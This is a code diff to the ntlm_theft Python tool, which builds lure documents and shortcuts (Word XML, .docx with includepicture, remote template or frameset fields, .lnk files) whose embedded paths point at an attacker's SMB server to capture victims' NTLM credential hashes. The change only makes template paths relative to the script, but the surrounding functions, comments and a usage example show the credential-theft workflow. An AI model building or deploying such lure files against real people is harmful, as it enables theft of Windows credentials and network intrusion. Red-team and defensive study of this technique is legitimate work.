@@ -30,6 +30,9 @@ import shutil
 import xlsxwriter
 from sys import exit
 
+#the basic path of the script, make it possible to run from anywhere
+script_directory = os.path.dirname(os.path.abspath(__file__))
+
 #arg parser to generate all or one file
 #python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
 parser = argparse.ArgumentParser(
@@ -129,7 +132,7 @@ def create_xml(generate,server,filename):
 # .xml with remote includepicture field attack
 # Filename: shareattack.xml, action=open, attacks=word
 def create_xml_includepicture(generate,server, filename):
-	documentfilename = os.path.join("templates", "includepicture-template.xml") 
+	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
 	# Read the template file
 	file = open(documentfilename, 'r', encoding="utf8")
 	filedata = file.read()
@@ -156,7 +159,7 @@ def create_htm(generate,server,filename):
 # .docx file with remote includepicture field attack
 def create_docx_includepicture(generate,server,filename):
 	# Source path  
-	src = os.path.join("templates", "docx-includepicture-template") 
+	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
 	# Destination path  
 	dest = os.path.join("docx-includepicture-template")
 	# Copy the content of  
@@ -183,7 +186,7 @@ def create_docx_includepicture(generate,server,filename):
 # Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
 def create_docx_remote_template(generate,server,filename):
 	# Source path  
-	src = os.path.join("templates", "docx-remotetemplate-template") 
+	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
 	# Destination path  
 	dest = os.path.join("docx-remotetemplate-template")
 	# Copy the content of  
@@ -208,7 +211,7 @@ def create_docx_remote_template(generate,server,filename):
 # .docx file with Frameset attack
 def create_docx_frameset(generate,server,filename):
 	# Source path  
-	src = os.path.join("templates", "docx-frameset-template") 
+	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
 	# Destination path  
 	dest = os.path.join("docx-frameset-template")
 	# Copy the content of  
@@ -420,7 +423,7 @@ def create_lnk(generate,server,filename):
 		print("Server name too long for lnk template, skipping.")
 		return
 	unc_path = unc_path.encode('utf-16le')
-	with open(os.path.join("templates", "shortcut-template.lnk"), 'rb') as lnk:
+	with open(os.path.join(script_directory,"templates", "shortcut-template.lnk"), 'rb') as lnk:
 		shortcut = list(lnk.read())
 	for i in range(0, len(unc_path)):
 		shortcut[offset + i] = unc_path[i]
